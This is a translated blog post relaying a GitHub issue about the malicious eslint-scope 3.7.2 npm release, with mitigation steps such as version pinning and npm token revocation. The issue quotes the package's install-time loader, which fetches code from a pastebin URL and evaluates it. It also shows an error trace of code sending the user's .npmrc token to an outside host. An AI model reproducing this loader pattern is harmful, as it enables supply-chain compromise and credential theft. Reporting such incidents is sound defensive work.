# eslint 中的病毒-范围 3.7.2

> 原文：<https://dev.to/maestromac/virus-in-eslint-scope-372-13cn>

我偶然发现了这个问题，想在这里分享一下。

# [![GitHub logo](img/75095a8afc1e0f207cda715962e75c8d.png) 病毒在 eslint-scope？ #39](https://github.com/eslint/eslint-scope/issues/39) 

[![pronebird avatar](img/335b8b5d91c591096f9a57543c0e09ef.png)](https://github.com/pronebird) **[pronebird](https://github.com/pronebird)** posted on [<time datetime="2018-07-12T11:17:18Z">Jul 12, 2018</time>](https://github.com/eslint/eslint-scope/issues/39)

## 更新博文:[https://eslint . org/blog/2018/07/postmortem-for-malicious-package-publishes](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes)

## 来自维护者的更新

[来自国家预防机制的事件状态报告](https://status.npmjs.org/incidents/dn7c1fgrr7ng)

请关注@platinumazure 的评论，该评论对所发生的事情有一点了解:[https://github . com/eslint/eslint-scope/issues/39 # issue comment-404533026](https://github.com/eslint/eslint-scope/issues/39#issuecomment-404533026)

在 eslint-config-eslint@5.0.2 中似乎也发布了相同的代码，但后来也没有发布。更多信息见[https://github.com/eslint/eslint/issues/10600](https://github.com/eslint/eslint/issues/10600)。

## 其间

1.  将`eslint-scope`的版本固定到`3.7.1`，一种方法是将`resolutions`添加到您的`package.json`中

```
 "resolutions": {
    "eslint-scope": "3.7.1"
  } 
```

用`yarn list eslint-scope`验证依赖版本。它应该打印出`eslint-scope@3.7.1`

2.  使用`package-lock.json`或`yarn.lock`，如果可能的话，把它放在你的回购中。即使`yarn outdated`显示有新版本可用，也不要升级到 3.7.2。

3.  按照下面评论中的建议撤销您的 NPM 令牌[https://github . com/eslint/eslint-scope/issues/39 # issue comment-404496856](https://github.com/eslint/eslint-scope/issues/39#issuecomment-404496856)。你可以登录 https://www.npmjs.com/的[，从账户下拉菜单中选择“代币”菜单，然后删除页面上列出的所有代币。如果您将 NPM 与外部服务挂钩，请确保重新创建相关令牌。](https://www.npmjs.com/)

## 这个问题

我不知道这到底是什么，但在我看来这像是一种病毒:

```
[2/3] ⠠ eslint-scope
error /Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope: Command failed.
Exit code: 1
Command: node ./lib/build.js
Arguments: 
Directory: /Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope
Output:
undefined:30
      https1.get({hostname:'sstatic1.histats.com',path:'/0.gif?4103075&101',method:'GET',headers:{Referer:'http://1.a/'+conten
                                                                                                                        ^^^^^^

SyntaxError: Unexpected end of input
    at IncomingMessage.r.on (/Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope/lib/build.js:6:10)
    at emitOne (events.js:116:13)
    at IncomingMessage.emit (events.js:211:7)
    at IncomingMessage.Readable.read (_stream_readable.js:475:10)
    at flow (_stream_readable.js:846:34)
    at resume_ (_stream_readable.js:828:3)
    at _combinedTickCallback (internal/process/next_tick.js:138:11) 
```

可疑文件的内容:

```
try{
    var https=require('https');
    https.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{
    r.setEncoding('utf8');
    r.on('data',(c)=>{
    eval(c);
    });
    r.on('error',()=>{});

    }).on('error',()=>{});
    }catch(e){}
```

Enter fullscreen mode Exit fullscreen mode

它试图加载的网址是[http://pastebin.com/raw/XLeVP82h](http://pastebin.com/raw/XLeVP82h)

它还试图将我的`.npmrc`发送到某个地方。

这是一小时前发布的 3.7.2 版本。

[View on GitHub](https://github.com/eslint/eslint-scope/issues/39)

软件包管理器是一个令人惊讶的传播病毒的媒介，尤其是当病毒依赖于`babel-eslint`的时候😱